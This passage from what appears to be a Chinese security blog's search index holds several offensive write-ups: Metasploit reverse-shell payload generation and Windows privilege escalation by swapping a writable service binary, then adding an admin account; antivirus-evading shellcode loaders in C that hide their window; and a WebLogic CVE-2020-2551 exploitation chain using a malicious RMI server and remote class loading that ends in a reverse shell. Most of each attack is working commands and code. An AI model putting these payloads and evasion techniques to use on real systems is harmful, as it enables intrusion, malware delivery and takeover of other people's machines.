RtlValidateHeap”问题。另外托管C++和CLI中不再支持/MT和/MTd选项。</p><p>/MD、/MDd：<br>/MD和/MDd表示采用多线程CRT库的动态dll版本，会使应用程序使用运行时库特定版本的多线程DLL。链接时将按照传统VC链接dll的方式将运行时库MSVCRxx.DLL的导入库MSVCRT.lib链接，在运行时要求安装了相应版本的VC运行时库可再发行组件包（当然把这些运行时库dll放在应用程序目录下也是可以的）。 因/MD和/MDd方式不会将运行时库链接到可执行文件内部，可有效减少可执行文件尺寸。当多项目以MD方式运作时，其内部会采用同一个堆，内存管理将被简化，跨模块内存管理问题也能得到缓解。</p></blockquote><h5 id="2-调试信息的隐藏"><a href="#2-调试信息的隐藏" class="headerlink" title="2.调试信息的隐藏"></a>2.调试信息的隐藏</h5><p>编译为可执行文件后，用16进制查看发现存在一些路径信息、printf的信息:<br><img src="https://i.loli.net/2020/10/09/xSUBOYdIzgMT7Xf.png" alt="路径信息"></p><p><img src="https://i.loli.net/2020/10/09/nbUVfdHhmwxWJpK.png" alt="printf的信息"></p><p>解决方法：<br>在属性链接器-调试中关闭调试信息：</p><p><img src="https://i.loli.net/2020/10/09/pHEgo97U3Xr4byD.png" alt="关闭调试信息生成"></p><p>然后捏，还可以用UPX 压缩一下文件 upx -9 xx.exe,从13kb压缩到9kb了。</p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.freebuf.com/vuls/245706.html">https://www.freebuf.com/vuls/245706.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> Windows 10 </tag>
            
            <tag> CVE-2020-1313 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的win提权</title>
      <link href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/"/>
      <url>/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p><h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p><pre class="line-numbers language-shell"><code class="language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本内容如下：</p><pre class="line-numbers language-shell"><code class="language-shell">use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.122.135set LPORT 443set ExitOnSession falseset EnableStageEncoding trueset EnableUnicodeEncoding trueset AutoRunScript 'post/windows/manage/migrate' run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p><h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p><p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p><h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p><p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p><p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p><h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/windows/gather/enum_services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p><p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p><pre class="line-numbers language-shell"><code class="language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p><p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p><p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p><h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows服务提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的源码免杀</title>
      <link href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/"/>
      <url>/2020/08/30/jian-dan-de-yuan-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p><h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p><p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p><pre class="line-numbers language-c"><code class="language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">12</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">8.102</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> <span class="token operator">-</span>f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/OPT:nowin98")</span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span><span class="token comment" spellcheck="true">//不显示窗口</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//内联汇编</span>    __asm       <span class="token punctuation">{</span>        lea eax<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>           call eax<span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>话不多说，先编译上线测试，启动msf监听：</p><pre class="line-numbers language-shell"><code class="language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p><h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p><p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p><p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">pragma</span> comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p><p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p><p>这里我们<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">ShowWindow</span><span class="token punctuation">(</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SW_HIDE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom免杀 </tag>
            
            <tag> C语言免杀 </tag>
            
            <tag> 隐藏程序窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-2551复现</title>
      <link href="/2020/08/22/cve-2020-2551-fu-xian/"/>
      <url>/2020/08/22/cve-2020-2551-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>2020年1月15日, Oracle官方发布了Weblogic IIOP反序列化漏洞CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。</p></blockquote><h4 id="2-获取exp并配置编译"><a href="#2-获取exp并配置编译" class="headerlink" title="2. 获取exp并配置编译"></a>2. <a href="https://github.com/zzwlpx/weblogicPoc">获取exp</a>并配置编译</h4><p> <i class="far fa-hand-point-right"> 给项目配置JDK</i><br>  <img src="https://i.loli.net/2020/08/22/eqLaXfthxCWPFkb.png" alt="目录结构"></p><p>  <img src="https://i.loli.net/2020/08/22/MTPlbWHDxef7IaJ.png" alt="选择jdk"></p><p> <i class="far fa-hand-point-right"> 配置Modules</i><br> 选择src 后点 Sources,  选择out 后点 Excluded<br> <img src="https://i.loli.net/2020/08/22/94IgR1yeohwfvVc.png"><br> 选完之后，看到一排红：<br><img src="https://i.loli.net/2020/08/22/QzGhpBJ8mcwI4SE.png"><br> 这是因为有些包没导入，代码找不到，这里把lib文件夹下的包导入进项目：<br> <img src="https://i.loli.net/2020/08/22/HJzGVU4k5uQACiI.png"><br> 然后就没得报错了：<br><img src="https://i.loli.net/2020/08/22/sAg9FH5QVyDKwou.png"></p><p>  <i class="far fa-hand-point-right"> 打包配置</i><br>配置build:<br><img src="https://i.loli.net/2020/08/22/bSU72uhVIwdpGCn.png"><br>选择main函数：<br><img src="https://i.loli.net/2020/08/22/BR8ElPGQiuxXgew.png"><br>build打包成可执行文件：<br><img src="https://i.loli.net/2020/08/22/hKMricwEuIpgAJn.png"><br>发现又报错了，说没设置输出路径，配置一下:<br><img src="https://i.loli.net/2020/08/22/7mbKwzFtJElnU6g.png"></p><p><img src="https://i.loli.net/2020/08/22/l1fcKw7dn4mZpJe.png"><br>继续build，又报错：<br><img src="https://i.loli.net/2020/08/22/PxagBIbLeO8G9k6.png"><br>是上面的配置jdk下面那个project language level选高了 ，改成8，再来一次build，哇 成功输出文件：<br><img src="https://i.loli.net/2020/08/22/iX89Nomy2hObsAf.png"><br>马上就要运行一下，没问题了：<br><img src="https://i.loli.net/2020/08/22/BbRS5vzxPM2E8Gn.png"></p><p><img src="https://i.loli.net/2020/08/22/4i25J7BTXm1aNUQ.png"></p><h4 id="3-进行复现"><a href="#3-进行复现" class="headerlink" title="3. 进行复现"></a>3. 进行复现</h4><p><i class="far fa-hand-point-right">首测失败</i><br>用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建了一个weblogic环境，恶意rmi使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">JNDI-Injection-Exploit</a>。但是这个工具编译版本为jdk1.7+,漏洞环境是jdk1.6，所以没成功，从下面日志中可以看到漏洞触发成功访问了rmi服务，但是接着报错不支持version 52，说明执行代码的jdk版本低于编译的jdk版本。搜到jdk版本和stanford parser对应关系是J2SE 8 = 52,J2SE 7 = 51,J2SE 6.0 = 50,J2SE 5.0 = 49,JDK 1.4 = 48,JDK 1.3 = 47,JDK 1.2 = 46,JDK 1.1 = 45，所以后面用指定编译版本为1.6编译exp。</p><p><img src="https://i.loli.net/2020/08/22/LnJFTZjINAUGHcO.png"></p><p><img src="https://i.loli.net/2020/08/22/pCW3QS8huHdq74i.png"><br><i class="far fa-hand-point-right">这下该成功了吧</i><br>1、使用<code>javac Poc.java -source 1.6 -target 1.6</code> 指定ban’y来编译我们的Poc.java:<br><img src="https://i.loli.net/2020/08/22/v7rx1BlsGL63Hbq.png"><br>并且启动一个web服务来让恶意类可以被访问到<code>python3 -m http.server 80</code></p><p>2、恶意rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.111.1/#Poc" 1099</code><br> <img src="https://i.loli.net/2020/08/22/tvqyw4ViMRDs6X2.png"><br> 3、用poc测试<code>java -jar CVE-2020-2551.jar 192.168.111.130 7001 rmi://192.168.111.1:1099/Poc</code><br> <img src="https://i.loli.net/2020/08/22/QWrdZmLjRFpC4k9.png"><br> 4、可以看到weblogic请求rmi后从web服务器里获取到了恶意类：<br><img src="https://i.loli.net/2020/08/22/3cKysEfCUx7w5uA.png"><br>5、此时上漏洞环境查看目录，命令执行成功：<br><img src="https://i.loli.net/2020/08/22/mOjkndpgSUhMAZX.png"><br>6、反弹shell：<br><img src="https://i.loli.net/2020/08/22/9te16OBNi8huVcP.png" alt="执行流程"></p><p><img src="https://i.loli.net/2020/08/22/k9sf8bBZaKXMTrI.png" alt="成功后的日志"></p><hr><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3">https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3</a><br><a href="https://www.cnblogs.com/zhaoqingqing/p/11847791.html">https://www.cnblogs.com/zhaoqingqing/p/11847791.html</a><br><a href="https://blog.csdn.net/weixin_43149083/article/details/89639747">https://blog.csdn.net/weixin_43149083/article/details/89639747</a><br><a href="https://y4er.com/post/weblogic-cve-2020-2551/">https://y4er.com/post/weblogic-cve-2020-2551/</a><br><a href="https://xz.aliyun.com/t/7374#toc-13">https://xz.aliyun.com/t/7374#toc-13</a><br><a href="https://xz.aliyun.com/t/7498">https://xz.aliyun.com/t/7498</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic漏洞 </tag>
            
            <tag> IDEA编译 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
